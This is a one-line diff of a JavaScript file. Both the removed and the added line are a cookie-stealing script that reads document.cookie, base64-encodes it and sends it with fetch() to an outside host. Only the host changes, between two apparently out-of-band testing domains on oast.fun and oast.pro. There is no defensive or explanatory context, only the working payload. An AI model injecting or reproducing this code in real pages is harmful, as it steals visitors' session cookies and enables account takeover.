@@ -1,1 +1,1 @@
-fetch("//d0pomdcfjaerpvvsc5bg888znyqd6cf8j.oast.fun/?c=" + btoa(document.cookie));
+fetch("//d0poor4fjaek5dn4mj007r4j17bc86xuw.oast.pro/?c=" + btoa(document.cookie));
